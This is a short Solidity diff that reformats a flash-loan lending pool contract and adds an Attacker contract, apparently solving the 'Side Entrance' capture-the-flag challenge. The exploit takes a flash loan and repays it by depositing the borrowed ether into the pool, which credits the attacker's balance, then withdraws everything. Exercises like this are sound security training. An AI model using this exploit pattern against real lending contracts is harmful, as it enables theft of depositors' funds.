@@ -29,7 +29,7 @@ contract SideEntranceLenderPool {
 
     function withdraw() external {
         uint256 amount = balances[msg.sender];
-        
+
         delete balances[msg.sender];
         emit Withdraw(msg.sender, amount);
 
@@ -41,7 +41,26 @@ contract SideEntranceLenderPool {
 
         IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
 
-        if (address(this).balance < balanceBefore)
-            revert RepayFailed();
+        if (address(this).balance < balanceBefore) revert RepayFailed();
     }
+}
+
+contract Attacker is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool public victim;
+
+    constructor(address addr) payable {
+        victim = SideEntranceLenderPool(addr);
+    }
+
+    function execute() external payable {
+        victim.deposit{value: 1001 ether}();
+    }
+
+    function attack() external {
+        victim.flashLoan(1000 ether);
+
+        victim.withdraw();
+    }
+
+    receive() external payable {}
 }
